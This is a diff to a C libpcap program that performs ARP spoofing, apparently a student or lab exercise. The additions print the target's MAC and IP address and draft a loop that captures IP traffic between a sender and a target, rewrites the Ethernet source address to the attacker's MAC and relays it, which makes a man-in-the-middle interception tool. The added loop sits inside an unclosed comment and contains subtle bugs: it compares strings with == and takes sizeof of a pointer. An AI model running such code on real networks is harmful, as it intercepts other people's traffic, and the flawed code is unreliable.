@@ -77,6 +77,7 @@ int main(int argc, char *argv[])
 	struct ether_header *reply_eth;
 	arphdr_t *reply_arp;
 	struct ip *reply_ip;
+	struct ip *iphdr;
 	unsigned char sender_mac[6]; 
 	unsigned char target_mac[6];
 
@@ -166,6 +167,9 @@ int main(int argc, char *argv[])
 		break;
 	}
 
+	printf("target MAC   %x:%x:%x:%x:%x:%x \n", target_mac[0], target_mac[1], target_mac[2], target_mac[3], target_mac[4], target_mac[5]); 
+	printf("target IP    %s\n", target_ip);
+
 	printf("******** get sender's info ********\n");
 
 	/* Make Ethernet packet */
@@ -240,6 +244,35 @@ int main(int argc, char *argv[])
 	printf("dst IP       %s\n", sender_ip);
 	
 	pcap_sendpacket(handle, infect, PACKET_SIZE);			
+
+	/* Get spoofed packet 
+	while(1) {
+		res = pcap_next_ex(handle, &header, &reply_packet);
+		if(res < 0) exit(1);
+	
+		reply_eth = (struct ether_header *)reply_packet;
+		if(reply_eth->ether_type != htons(ETHERTYPE_IP)) continue;
+		
+		reply_ip = (struct ip *)(reply_packet + sizeof(struct ether_header));
+		if(inet_ntoa(reply_ip->ip_dst) == target_ip) {
+			/* from sender to target packet 
+			for(int i=0;i<ETH_ALEN;i++) reply_eth->ether_dhost[i] = target_mac[i];
+			for(int i=0;i<ETH_ALEN;i++) reply_eth->ether_shost[i] = attacker_mac[i];			
+		
+			pcap_sendpacket(handle, reply_packet, sizeof(reply_packet));	
+		}
+		else if(inet_ntoa(reply_ip->ip_dst) == sender_ip) {
+			/* from target to sender packet 
+			for(int i=0;i<ETH_ALEN;i++) reply_eth->ether_dhost[i] = sender_mac[i];
+			for(int i=0;i<ETH_ALEN;i++) reply_eth->ether_shost[i] = attacker_mac[i];			
+		
+			pcap_sendpacket(handle, reply_packet, sizeof(reply_packet));	
+		}
+		
+		pcap_sendpacket(handle, infect, PACKET_SIZE);
+	
+		break;
+	}
 
 	/* Close handle */
 	pcap_close(handle);
